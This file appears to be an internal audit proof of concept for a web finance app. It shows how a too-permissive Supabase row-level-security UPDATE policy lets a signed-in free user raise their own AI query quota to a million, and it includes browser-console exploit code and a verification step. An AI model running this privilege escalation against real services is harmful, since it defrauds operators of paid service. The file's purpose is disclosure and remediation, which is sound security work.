/**
 * PoC for NEW-P0b — Profiles UPDATE RLS policy permits AI-quota privilege escalation.
 *
 * USAGE: paste into browser console on any *.profinancecast.com page that has
 * loaded js/pfc-config.js + the Supabase JS bundle. The user must be SIGNED IN
 * (free tier is fine — this exploit is what makes free indistinguishable from
 * Pro for Sage AI).
 *
 * EXPECTED RESULT: returns { data: [...], error: null } on a successful
 * privilege escalation. After this, /api/sage will allow up to ai_queries_limit
 * messages before refusing — i.e., 1,000,000 calls instead of the free-tier 0.
 *
 * VERIFICATION: after running, GET /api/subscription/status with the same
 * session JWT — the .queries.limit field will reflect the new value.
 *
 * REMEDIATION: drop the open UPDATE policy. See the migration sketch in the
 * NEW-P0b finding inside 2026-05-23-payments-reaudit.md.
 *
 * AUTH-INVARIANT: this exploit does NOT require the attacker to know any other
 * user's id — they can only escalate their own row. But "their own row" goes
 * from 0 free quota to unlimited Gemini calls, which is the launch-blocker.
 */

(async () => {
  // Make sure Supabase + auth are wired up the way the app does.
  if (!window.PFC_CONFIG) {
    console.error('[poc] PFC_CONFIG missing — load this on a profinancecast.com page');
    return;
  }
  if (typeof supabase === 'undefined') {
    // Some pages don't expose `supabase` globally — recreate it from the anon key.
    const sb = window.supabase || (await import('https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm')).createClient(
      window.PFC_CONFIG.SUPABASE_URL,
      window.PFC_CONFIG.SUPABASE_ANON_KEY
    );
    window.__pocSupabase = sb;
  }
  const sb = window.__pocSupabase || window.supabase;

  const { data: userData, error: userErr } = await sb.auth.getUser();
  if (userErr || !userData?.user) {
    console.error('[poc] not signed in — sign in first, then re-run');
    return;
  }
  const userId = userData.user.id;
  console.log('[poc] escalating quota for user', userId);

  // The exploit: column-unrestricted UPDATE on profiles is permitted by the
  // "users_set_first_forecast_once" policy installed in migration
  // 20260510_owner_override_and_forecast_policy.sql:21-27.
  const { data, error } = await sb
    .from('profiles')
    .update({
      ai_queries_used:  0,           // re-zero so the new ceiling counts from now
      ai_queries_limit: 1_000_000,   // any large number works
    })
    .eq('id', userId)
    .select('id, ai_queries_used, ai_queries_limit, plan');

  if (error) {
    console.log('[poc] UPDATE rejected (good — RLS is tight):', error);
    return;
  }
  console.log('[poc] UPDATE accepted — exploit works:', data);

  // Verify via the canonical status endpoint.
  const session = (await sb.auth.getSession()).data?.session;
  const r = await fetch('/api/subscription/status', {
    headers: { Authorization: `Bearer ${session.access_token}` },
  });
  const status = await r.json();
  console.log('[poc] /api/subscription/status now reports:', status.queries);
  // Expected: { used: 0, limit: 1000000, resetsAt: ... }
})();
